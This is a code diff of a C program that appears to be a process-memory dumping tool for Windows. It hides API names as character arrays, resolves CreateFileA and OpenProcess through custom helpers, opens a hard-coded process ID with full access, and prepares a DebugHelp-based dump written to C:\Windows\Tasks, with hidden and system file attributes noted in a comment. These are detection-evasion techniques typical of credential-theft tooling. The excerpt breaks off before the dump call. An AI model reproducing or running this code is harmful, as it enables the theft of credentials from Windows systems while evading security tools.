@@ -17,8 +17,12 @@ int main()
     pCreateFileA CreateFileA = (pCreateFileA) hlpGetProcAddress(hlpGetModuleHandle(kern32), sCreateFile);
     printf("Create file A addr: %p\0", *CreateFileA);
 
-    char fileName[] = {'C', ':', '\\', 'T', 'e', 'm', 'p', '\\', 't', 'e', 's', 't', '.', 'd', 'm', 'p', 0};
-    HANDLE hFile = CreateFileA(fileName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    char fileName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'T', 'a', 's', 'k', 's', '\\', 't', 'e', 's', 't', '.', 'd', 'm', 'p', 0 };
+    // FILE_ATTRIBUTE_HIDDEN FILE_ATTRIBUTE_SYSTEM
+    HANDLE hFile = CreateFileA(fileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+        return printf("Error: %d\n", GetLastError());
+
 
     printf("getting handle to process\0");
     char sOpenProcess[] = { 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0};
@@ -28,6 +32,8 @@ int main()
     DWORD pid = 1364;
 
     HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
+    if (hProc == NULL)
+        return printf("Could not open process");
 
     printf("Creating dump\0");
     char dbghlp[] = {'D', 'e', 'b', 'u', 'g', 'H', 'e', 'l', 'p', '.', 'd', 'l', 'l', 0};
